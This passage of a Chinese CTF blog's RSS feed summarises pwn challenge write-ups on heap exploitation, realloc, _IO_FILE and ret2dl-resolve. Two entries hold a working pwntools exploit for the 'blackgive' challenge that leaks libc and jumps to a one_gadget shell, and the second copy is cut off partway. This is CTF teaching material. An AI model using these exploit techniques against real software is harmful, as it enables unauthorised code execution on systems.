&lt;p>这里对 size_arr 进行了更新，使用的是 &lt;code>strlen&lt;/code>，那么只要我们把输入的字符串和下一个 chunk 的 size 接起来，就可以扩大 size，这样就可以在下一次 edit 时修改下一个 chunk 的 size。&lt;/p></description></item><item><title>PWNABLE.TW-Heap Paradise-WP</title><link>https://chujdk.github.io/wp/1214.html</link><pubDate>Tue, 23 Mar 2021 23:00:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1214.html</guid><description>&lt;p>第二次碰到这题，上次无思路放弃了，这次觉得不能放弃了，就学习了一下，也算是开拓一下利用的思路吧。&lt;/p>
&lt;div style="text-align:center">&lt;img src="https://chujdk.github.io/usr/uploads/2021/03/1990905493.png
">&lt;/div>
&lt;p>又是如此，只有分配和回收，保护全开。和昨天做的 &lt;a href="https://chujdk.github.io/WP/1210.html">Re-alloc Revenge&lt;/a> 很像，不过此题 libc 版本为 2.23，难度陡增。&lt;/p></description></item><item><title>PWNABLE.TW-Re-alloc Revenge-WP</title><link>https://chujdk.github.io/wp/1210.html</link><pubDate>Sun, 21 Mar 2021 23:32:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1210.html</guid><description>&lt;p>前段时间做了一道&lt;a href="https://chujdk.github.io/WP/1203.html">利用 &lt;code>realloc&lt;/code> 的题&lt;/a>，感觉很有意思。看到此题的名字就有了兴趣，于是花了一天解了一下。&lt;/p>
&lt;p>关于 &lt;code>realloc&lt;/code> 的特性和攻击 &lt;code>_IO_FILE&lt;/code>，本文不再赘述，可见此 WP &lt;a href="https://chujdk.github.io/WP/1203.html">TWCTF_online_2019_asterisk_alloc&lt;/a>&lt;/p></description></item><item><title>PWNABLE.TW-Spirited Away-WP</title><link>https://chujdk.github.io/wp/1208.html</link><pubDate>Sat, 20 Mar 2021 21:09:44 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1208.html</guid><description>&lt;p>比较简单的栈溢出加堆溢出。&lt;/p>
&lt;div style="text-align:center">&lt;img src="https://chujdk.github.io/usr/uploads/2021/03/3731835457.png
">&lt;/div>
&lt;p>此处在 &lt;code>cnt &amp;gt;= 100&lt;/code> 时有单字节溢出，会把 &lt;code>nbytes&lt;/code> 溢出成 &lt;code>n&lt;/code>&lt;/p>
&lt;p>然后通过此处&lt;/p>
&lt;div style="text-align:center">&lt;img src="https://chujdk.github.io/usr/uploads/2021/03/3308204097.png
">&lt;/div>
&lt;p>修改 buf，使之指向栈上一段可控空间&lt;/p>
&lt;div style="text-align:center">&lt;img src="https://chujdk.github.io/usr/uploads/2021/03/3397584944.png
">&lt;/div>
&lt;p>比如这一段，我们可以轻易地布置 fake chunk&lt;/p></description></item><item><title>PWNABLE.TW-death_note-WP</title><link>https://chujdk.github.io/wp/1204.html</link><pubDate>Sat, 20 Mar 2021 17:05:37 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1204.html</guid><description>&lt;p>漏洞在于数组访问越界和堆栈可执行。在 &lt;code>add_note&lt;/code> 函数中输入负数可以修改 got 表，使之指向一段我们可写的地址。自然地可以想到布置 shellcode getshell。然而本题对输入的 shellcode 进行了检查，每个字符都需要是可输出字符，这种题之前做过两道，都是使用工具自动生成的。因为我一直觉得 shellcode 这种东西挺没意思的，就一直没有深究到底该怎么写它，一直都是用工具生成，这道题就吃瘪了，把 shellcode 长度限制在了 80 中，现成的 shellcode 都无法使用。于是只能自己写&lt;/p></description></item><item><title>BUU-TWCTF_online_2019_asterisk_alloc-WP</title><link>https://chujdk.github.io/wp/1203.html</link><pubDate>Fri, 19 Mar 2021 13:20:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1203.html</guid><description>&lt;p>这道题涉及到 &lt;code>realloc&lt;/code> 的利用，还蛮新奇的，第一次接触。昨天晚上卡了一晚上没做出来，今天终于是解完了。&lt;/p>
&lt;p>首先 &lt;code>realloc&lt;/code> 在申请的空间不同时，行为也是不同的。我们记申请的大小为 Nsize，ptr 指向的堆块的大小为 Osize，那么在调用 &lt;code>realloc(ptr,Nsize)&lt;/code> 时有以下几种情况&lt;/p></description></item><item><title>BUU-rootersctf_2019_heaaaappppp-WP</title><link>https://chujdk.github.io/wp/1195.html</link><pubDate>Wed, 17 Mar 2021 20:56:07 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1195.html</guid><description>&lt;p>此题的起名吸引了我去做它。题目不难，不过之前从来没有做过 &lt;code>Tcache dup&lt;/code> 类的利用，也算是学习了新知识（考虑到这和 &lt;code>fastbin double free&lt;/code> 相比除了简单不少之外没有什么区别，其实还是只做了一道水题）。题目有给我一定的困扰，也有考虑放弃去找 WP，但是没找到，就只能自己做了，结果做了出来。这个故事我觉得以后做题还是要更加坚持。&lt;/p></description></item><item><title>BUU-sleepyHolder_hitcon_2016-WP</title><link>https://chujdk.github.io/wp/1192.html</link><pubDate>Tue, 16 Mar 2021 20:48:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1192.html</guid><description>&lt;p>不得不说 hitcon 2016 那场比赛的堆题是真的都很牛叉，让我学到了很多东西。这道题和同场比赛中的 &lt;a href="https://chujdk.github.io/WP/1161.html">secret_holder&lt;/a> 有在总体流程上几乎一样，但是利用方式不同。&lt;/p>
&lt;p>这个程序除了 double free 之外是没有漏洞的，如何利用这个 double free 呢？之前那道 secret_holder 是通过类似 chunk overlapping 的方法实现 UAF 然后 &lt;code>unlink&lt;/code> 的，但是本题的 huge chunk 只能申请一次，然后就完全无法操作了。那么如何实现类似的 UAF 呢？方法比较巧妙，我也很遗憾自己没有想出来。利用的是 &lt;code>malloc_consolidate&lt;/code> 函数，我们知道 ptmalloc 在处理 big request 的时候，遍历到 large bin 的时候，会先调用 &lt;code>malloc_consolidate&lt;/code> 函数整理碎片，这个时候会把 fastbin 中所有的 bin 先尝试合并，然后放到其对应的 bin 中。而本题可以申请一次 huge chunk，就有了触发 &lt;code>malloc_consolidate&lt;/code> 的机会。我们的解法就是申请一个 small secret，再申请一个 big secret，两个 chunk 分别记作 A，B，先 &lt;code>free&lt;/code> 掉 A，然后申请 huge secret，在 &lt;code>malloc_consolidate&lt;/code> 后，A，本来属于 fastbin，就被收入了 smallbin，其下一个 chunk，也就是 B 的 &lt;code>prev_inuse&lt;/code> 位被置为零。&lt;/p></description></item><item><title>HgameFINAL-nohook-WP</title><link>https://chujdk.github.io/wp/1183.html</link><pubDate>Sat, 13 Mar 2021 23:01:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1183.html</guid><description>&lt;p>Final 就做出这一道，第二道 webpwn 确实不太会，花了很长时间才搞出环境，最后无时间了。语神和我说出这个题也没想让我们做出来，感到一丝恶意和一丝释然。Hgame 到这里也正式结束了，总结就不写了。&lt;/p></description></item><item><title>XCTF-house_of_grey-WP</title><link>https://chujdk.github.io/wp/1176.html</link><pubDate>Thu, 11 Mar 2021 19:59:53 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1176.html</guid><description>&lt;p>看到题目还以为是堆利用，但是实际上是文件系统中的一个小 trick。&lt;/p>
&lt;p>前置的是 &lt;code>/proc&lt;/code> 目录的知识，可以看&lt;a href="https://chujdk.github.io/pwnreview/1070.html">这篇文章&lt;/a>&lt;/p>
&lt;p>&lt;em>这个知识在 hgame 中第一次碰到，可看&lt;a href="https://chujdk.github.io/WP/1079.html">这篇 WP&lt;/a> 中的 &lt;code>the_shop_of_cosmos&lt;/code>&lt;/em>&lt;/p>
&lt;h3 id="漏洞点">漏洞点&lt;/h3>
&lt;h4 id="任意地址写">任意地址写&lt;/h4>
&lt;div style="text-align:center">&lt;img src="https://chujdk.github.io/usr/uploads/2021/03/3112616554.png
">&lt;/div>
&lt;p>这里的 &lt;code>buf&lt;/code> 可以把 &lt;code>v8&lt;/code> 溢出掉，结合&lt;/p></description></item><item><title>HITCON-House of Orange-WP</title><link>https://chujdk.github.io/wp/1167.html</link><pubDate>Tue, 09 Mar 2021 23:20:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1167.html</guid><description>&lt;p>House of Orange 是很有名的一种利用方法，早有耳闻，这次准备研究一下。&lt;/p>
&lt;h3 id="quick-faq">quick FAQ&lt;/h3>
&lt;p>Q：为什么我日不穿 XCTF-adword 的靶机！&lt;/p>
&lt;p>A：XCTF 提供的 libc &lt;strong>是错的&lt;/strong>&lt;/p>
&lt;p>解决方案：用 LibcSearcher。&lt;/p>
&lt;p>&lt;em>这个问题浪费了我 2-3 个小时:(。至于我是如何发现 libc 是错的，我会在文末提及。&lt;/em>&lt;/p></description></item><item><title>XCTF-magic-WP</title><link>https://chujdk.github.io/wp/1165.html</link><pubDate>Sun, 07 Mar 2021 19:50:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1165.html</guid><description>&lt;h1 id="这篇-wp-没有写完">这篇 WP 没有写完！！！&lt;/h1>
&lt;p>我还没有完成这篇 WP，因为有太多的源码没有研究，建议您看&lt;a href="https://blog.csdn.net/seaaseesa/article/details/103479788">这一篇&lt;/a>&lt;/p>
&lt;h3 id="写在前面">写在前面&lt;/h3>
&lt;p>这道题是一个 &lt;code>_IO_FILE&lt;/code> 利用，大概是我做过的最难的一道题，基本是看着 wp 才做出来的。同时 &lt;code>_IO_FILE&lt;/code> 利用和源码的联系非常紧密，之后我会仔细研究一下源码，现在这篇 wp 还是非常的不成熟，许多地方我没有详细解释。&lt;/p></description></item><item><title>XCTF/BUU-secret_holder-WP</title><link>https://chujdk.github.io/wp/1161.html</link><pubDate>Sat, 06 Mar 2021 08:22:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1161.html</guid><description>&lt;p>XCTF 提供了莫名其妙的附件，不能解压。所以只好自己找 binary。&lt;a href="https://pwn-1253291247.cos.ap-chengdu.myqcloud.com/SecretHolder">下载链接&lt;/a>&lt;/p>
&lt;h3 id="前置知识">前置知识&lt;/h3>
&lt;p>这道题出现了 mmap 的情况，这是我之前不曾碰到过的。&lt;/p>
&lt;div style="text-align:center">&lt;img src="https://chujdk.github.io/usr/uploads/2021/03/2786364996.png
">&lt;/div>
&lt;p>红框中申请了一个巨大的空间，引用华庭《glibc内存管理ptmalloc源代码分析》中的分析&lt;/p></description></item><item><title>XCTF-RCalc-WP</title><link>https://chujdk.github.io/wp/1157.html</link><pubDate>Sat, 06 Mar 2021 00:00:10 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1157.html</guid><description>&lt;p>这是一个挺有意思的栈溢出题，很久没做过栈溢出了，居然看了很久才发现漏洞点是栈溢出..&lt;/p>
&lt;div style="text-align:center">&lt;img src="https://chujdk.github.io/usr/uploads/2021/03/855349889.png
">&lt;/div>
&lt;p>这里很明显有栈溢出，然后下面的&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-fallback" data-lang="fallback">&lt;span style="display:flex;">&lt;span>result = sub_400B92();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>if ( result != v2 )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sub_400BD4();
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>感觉像是 canary，但是 &lt;code>checksec&lt;/code> 一下发现并没有开启 canary&lt;/p></description></item><item><title> XCTF/BUU-4th-QCTF-2018-babyheap-WP</title><link>https://chujdk.github.io/wp/1144.html</link><pubDate>Fri, 05 Mar 2021 14:25:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1144.html</guid><description>&lt;p>&lt;em>3.04&lt;/em>&lt;/p>
&lt;p>这道题题目给的 libc 是 32 位的，但是程序本身是 64 位的..更令人崩溃的是查不出题目用的 libc，所以我基本是打不穿远程了，但是题目本身还是可以做一下，今天 leak 出了 libc_base，但是比较晚了，明天还有早八，所以先不搞了。&lt;/p></description></item><item><title>XCTF-shell-WP</title><link>https://chujdk.github.io/wp/1135.html</link><pubDate>Wed, 03 Mar 2021 19:00:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1135.html</guid><description>&lt;p>一道 8 分题，其实也没多难，就是思路很骚。我没想到，着实可惜。&lt;/p>
&lt;p>读入全部使用 &lt;code>gets&lt;/code>，随便溢出。我们需要的是把 &lt;code>v16&lt;/code> 置为 1，自然的思路是通过溢出实现，但是做不到，我们能溢出的全部在它下面，所以只能尝试通过 &lt;code>login&lt;/code> 的验证。&lt;/p></description></item><item><title>XCTF-nobug-WP</title><link>https://chujdk.github.io/wp/1134.html</link><pubDate>Tue, 02 Mar 2021 20:27:27 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1134.html</guid><description>&lt;p>这道题的 exp 应该是近期写的最短的，但是却是最令我迷惑的题。&lt;/p>
&lt;p>一开始就是一个输入，然后输入的字符串会被传到这个函数里面进行处理&lt;/p>
&lt;div style="text-align:center">&lt;img src="https://chujdk.github.io/usr/uploads/2021/03/436952076.png
">&lt;/div>
&lt;p>这个函数非常的复杂，完全不知道它在做什么，我一度怀疑这是一道逆向题。然后了解到从它查表得行为和随便输入往往会转换出乱码俩个特征可以猜测这是一个 base64 加密，简单尝试一下就可以确认这一点。&lt;/p></description></item><item><title>XCTF-onemanarmy-WP</title><link>https://chujdk.github.io/wp/1131.html</link><pubDate>Mon, 01 Mar 2021 19:19:45 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1131.html</guid><description>&lt;p>这道题目还算简单，但是乍一看容易懵（反正我懵了）。&lt;/p>
&lt;p>首先保护是全开的&lt;/p>
&lt;div style="text-align:center">&lt;img src="https://chujdk.github.io/usr/uploads/2021/03/1081136312.png">
&lt;/div>
&lt;p>分配这里非常的随意，但最多只能分配大小为 0x1FF 的 chunk，libc 版本为 2.27，虽然有提供 show 的功能&lt;/p></description></item><item><title>XCTF-Noleak-WP</title><link>https://chujdk.github.io/wp/1123.html</link><pubDate>Sun, 28 Feb 2021 21:58:23 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1123.html</guid><description>&lt;p>HCTF-game 终于是结束了，我也没有借口再不做题了，所以从今天开始还是要继续每天一题（&lt;del>尽量吧&lt;/del>）。&lt;/p>
&lt;p>这道题目比较麻烦，是我做过的和堆相关的最麻烦的一道题。前前后后加起来大概做了将近两个小时，从下题到交 flag 总共将近十个小时，主要是中间被一些事情耽搁了。这里也真的是要发发牢骚，大学里面总是会有一些莫名其妙的破事和破人，今天就碰到了，非常的不爽，都是成年人了还有人要管别人对待破事的“态度”，真的是无法理解。&lt;/p></description></item><item><title>HGAME2021-WEEK4-PWN-WP</title><link>https://chujdk.github.io/wp/1108.html</link><pubDate>Sun, 28 Feb 2021 20:00:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1108.html</guid><description>&lt;p>hgame 也差不多结束了，第四周只做了 pwn，别的方向都不太会。pwn 的题还是比较简单的。&lt;/p>
&lt;h3 id="house_of_cosmos">house_of_cosmos&lt;/h3>
&lt;p>漏洞点看了很久才看出来&lt;/p>
&lt;div style="text-align:center">&lt;img src="https://chujdk.github.io/usr/uploads/2021/02/1322405410.png
">&lt;/div>
&lt;p>读入函数这里的 &lt;code>i&lt;/code> 是 &lt;code>unsigned int&lt;/code>，所以当 &lt;code>a2 &amp;lt;= 0&lt;/code> 时，就可以输入几乎无限的字符，轻松实现堆溢出。由于没有提供 &lt;code>show&lt;/code> 的功能，像前两周那样通过 &lt;code>Unsorted Bin&lt;/code> 来 leak 的方法就比较难了。但是既然可以堆溢出，又有指向堆块的指针，我们就可以朴素地用 &lt;code>unlink&lt;/code> 来实现利用。&lt;/p></description></item><item><title>HGAME-WEEK3-WP</title><link>https://chujdk.github.io/wp/1100.html</link><pubDate>Sun, 21 Feb 2021 20:00:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1100.html</guid><description>&lt;h2 id="pwn">pwn&lt;/h2>
&lt;h3 id="blackgive">blackgive&lt;/h3>
&lt;p>栈迁移，不要想复杂了&lt;/p>
&lt;h4 id="exp">exp&lt;/h4>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#60a0b0;font-style:italic">#!/usr/bin/env python&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#60a0b0;font-style:italic"># coding=utf-8&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#007020;font-weight:bold">from&lt;/span> &lt;span style="color:#0e84b5;font-weight:bold">pwn&lt;/span> &lt;span style="color:#007020;font-weight:bold">import&lt;/span> &lt;span style="color:#666">*&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>context(log_level &lt;span style="color:#666">=&lt;/span> &lt;span style="color:#4070a0">&amp;#39;debug&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>context&lt;span style="color:#666">.&lt;/span>terminal &lt;span style="color:#666">=&lt;/span> [&lt;span style="color:#4070a0">&amp;#39;tmux&amp;#39;&lt;/span>,&lt;span style="color:#4070a0">&amp;#39;splitw&amp;#39;&lt;/span>,&lt;span style="color:#4070a0">&amp;#39;-h&amp;#39;&lt;/span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sh &lt;span style="color:#666">=&lt;/span> process(&lt;span style="color:#4070a0">&amp;#34;./blackgive&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#60a0b0;font-style:italic">#sh = remote(&amp;#34;&amp;#34;)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>libc &lt;span style="color:#666">=&lt;/span> ELF(&lt;span style="color:#4070a0">&amp;#34;./libc6_2.27-3ubuntu1.4_amd64.so&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>elf &lt;span style="color:#666">=&lt;/span> ELF(&lt;span style="color:#4070a0">&amp;#34;./blackgive&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>pop_rdi_ret &lt;span style="color:#666">=&lt;/span> &lt;span style="color:#40a070">0x400813&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>bss_base &lt;span style="color:#666">=&lt;/span> &lt;span style="color:#40a070">0x6010A0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>off &lt;span style="color:#666">=&lt;/span> &lt;span style="color:#40a070">0xA0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>payload &lt;span style="color:#666">=&lt;/span> &lt;span style="color:#4070a0">&amp;#39;paSsw0rd&amp;#39;&lt;/span>&lt;span style="color:#666">.&lt;/span>ljust(&lt;span style="color:#40a070">0x20&lt;/span>,&lt;span style="color:#4070a0">&amp;#39;&lt;/span>&lt;span style="color:#4070a0;font-weight:bold">\x00&lt;/span>&lt;span style="color:#4070a0">&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>payload &lt;span style="color:#666">+=&lt;/span> p64(bss_base &lt;span style="color:#666">+&lt;/span> off &lt;span style="color:#666">-&lt;/span> &lt;span style="color:#40a070">0x8&lt;/span>) &lt;span style="color:#666">+&lt;/span> p64(&lt;span style="color:#40a070">0x4007A3&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sh&lt;span style="color:#666">.&lt;/span>recvuntil(&lt;span style="color:#4070a0">&amp;#34;password:&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#60a0b0;font-style:italic">#gdb.attach(proc.pidof(sh)[0])&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sh&lt;span style="color:#666">.&lt;/span>send(payload)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>payload &lt;span style="color:#666">=&lt;/span> &lt;span style="color:#4070a0">&amp;#39;&lt;/span>&lt;span style="color:#4070a0;font-weight:bold">\x00&lt;/span>&lt;span style="color:#4070a0">&amp;#39;&lt;/span> &lt;span style="color:#666">*&lt;/span> off &lt;span style="color:#666">+&lt;/span> p64(pop_rdi_ret) &lt;span style="color:#666">+&lt;/span> p64(elf&lt;span style="color:#666">.&lt;/span>got[&lt;span style="color:#4070a0">&amp;#39;puts&amp;#39;&lt;/span>]) &lt;span style="color:#666">+&lt;/span> p64(elf&lt;span style="color:#666">.&lt;/span>sym[&lt;span style="color:#4070a0">&amp;#39;puts&amp;#39;&lt;/span>]) &lt;span style="color:#666">+&lt;/span> p64(&lt;span style="color:#40a070">0x40070a&lt;/span>) 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sh&lt;span style="color:#666">.&lt;/span>sendlineafter(&lt;span style="color:#4070a0">&amp;#34;!&lt;/span>&lt;span style="color:#4070a0;font-weight:bold">\n&lt;/span>&lt;span style="color:#4070a0">&amp;#34;&lt;/span>,payload)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>puts_addr &lt;span style="color:#666">=&lt;/span> u64(sh&lt;span style="color:#666">.&lt;/span>recvuntil(&lt;span style="color:#4070a0">&amp;#39;&lt;/span>&lt;span style="color:#4070a0;font-weight:bold">\n&lt;/span>&lt;span style="color:#4070a0">&amp;#39;&lt;/span>,drop &lt;span style="color:#666">=&lt;/span> &lt;span style="color:#007020;font-weight:bold">True&lt;/span>)&lt;span style="color:#666">.&lt;/span>ljust(&lt;span style="color:#40a070">8&lt;/span>,&lt;span style="color:#4070a0">&amp;#39;&lt;/span>&lt;span style="color:#4070a0;font-weight:bold">\x00&lt;/span>&lt;span style="color:#4070a0">&amp;#39;&lt;/span>))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>libc_base &lt;span style="color:#666">=&lt;/span> puts_addr &lt;span style="color:#666">-&lt;/span> libc&lt;span style="color:#666">.&lt;/span>sym[&lt;span style="color:#4070a0">&amp;#39;puts&amp;#39;&lt;/span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>payload &lt;span style="color:#666">=&lt;/span> &lt;span style="color:#4070a0">&amp;#39;paSsw0rd&amp;#39;&lt;/span>&lt;span style="color:#666">.&lt;/span>ljust(&lt;span style="color:#40a070">0x20&lt;/span>,&lt;span style="color:#4070a0">&amp;#39;&lt;/span>&lt;span style="color:#4070a0;font-weight:bold">\x00&lt;/span>&lt;span style="color:#4070a0">&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>payload &lt;span style="color:#666">+=&lt;/span> p64(&lt;span style="color:#40a070">0&lt;/span>) &lt;span style="color:#666">+&lt;/span> p64(libc_base &lt;span style="color:#666">+&lt;/span> &lt;span style="color:#40a070">0x4f432&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sh&lt;span style="color:#666">.&lt;/span>sendafter(&lt;span style="color:#4070a0">&amp;#34;password:&amp;#34;&lt;/span>,payload)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sh&lt;span style="color:#666">.&lt;/span>interactive()
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="without_leak">without_leak&lt;/h3>
&lt;p>64 位 &lt;code>ret2dl-resolve&lt;/code> 裸题。由于输出流都被关闭，所以无法实现 leak，考虑进行 &lt;code>ret2dl-resolve&lt;/code>。由于提供了 &lt;code>libc&lt;/code>，考虑通过伪造 &lt;code>link_map&lt;/code> 结构体 getshell。打本地的时候，即便打通了也会有&lt;/p></description></item><item><title>HGAME2021-WEEK3-PWN-WP</title><link>https://chujdk.github.io/wp/1090.html</link><pubDate>Tue, 16 Feb 2021 16:08:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1090.html</guid><description>&lt;h3 id="blackgive">blackgive&lt;/h3>
&lt;p>栈迁移&lt;/p>
&lt;h4 id="exp">exp&lt;/h4>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#60a0b0;font-style:italic">#!/usr/bin/env python&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#60a0b0;font-style:italic"># coding=utf-8&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#007020;font-weight:bold">from&lt;/span> &lt;span style="color:#0e84b5;font-weight:bold">pwn&lt;/span> &lt;span style="color:#007020;font-weight:bold">import&lt;/span> &lt;span style="color:#666">*&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>context(log_level &lt;span style="color:#666">=&lt;/span> &lt;span style="color:#4070a0">&amp;#39;debug&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>context&lt;span style="color:#666">.&lt;/span>terminal &lt;span style="color:#666">=&lt;/span> [&lt;span style="color:#4070a0">&amp;#39;tmux&amp;#39;&lt;/span>,&lt;span style="color:#4070a0">&amp;#39;splitw&amp;#39;&lt;/span>,&lt;span style="color:#4070a0">&amp;#39;-h&amp;#39;&lt;/span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sh &lt;span style="color:#666">=&lt;/span> process(&lt;span style="color:#4070a0">&amp;#34;./blackgive&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#60a0b0;font-style:italic">#sh = remote(&amp;#34;&amp;#34;)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>libc &lt;span style="color:#666">=&lt;/span> ELF(&lt;span style="color:#4070a0">&amp;#34;./libc6_2.27-3ubuntu1.4_amd64.so&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>elf &lt;span style="color:#666">=&lt;/span> ELF(&lt;span style="color:#4070a0">&amp;#34;./blackgive&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>pop_rdi_ret &lt;span style="color:#666">=&lt;/span> &lt;span style="color:#40a070">0x400813&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>bss_base &lt;span style="color:#666">=&lt;/span> &lt;span style="color:#40a070">0x6010A0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>off &lt;span style="color:#666">=&lt;/span> &lt;span style="color:#40a070">0xA0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>payload &lt;span style="color:#666">=&lt;/span> &lt;span style="color:#4070a0">&amp;#39;paSsw0rd&amp;#39;&lt;/span>&lt;span style="color:#666">.&lt;/span>ljust(&lt;span style="color:#40a070">0x20&lt;/span>,&lt;span style="color:#4070a0">&amp;#39;&lt;/span>&lt;span style="color:#4070a0;font-weight:bold">\x00&lt;/span>&lt;span style="color:#4070a0">&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>payload &lt;span style="color:#666">+=&lt;/span> p64(bss_base &lt;span style="color:#666">+&lt;/span> off &lt;span style="color:#666">-&lt;/span> &lt;span style="color:#40a070">0x8&lt;/span>) &lt;span style="color:#666">+&lt;/span> p64(&lt;span style="color:#40a070">0x4007A3&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sh&lt;span style="color:#666">.&lt;/span>recvuntil(&lt;span style="color:#4070a0">&amp;#34;password:&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#60a0b0;font-style:italic">#gdb.attach(proc.pidof(sh)[0])&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sh&lt;span style="color:#666">.&lt;/span>send(payload)
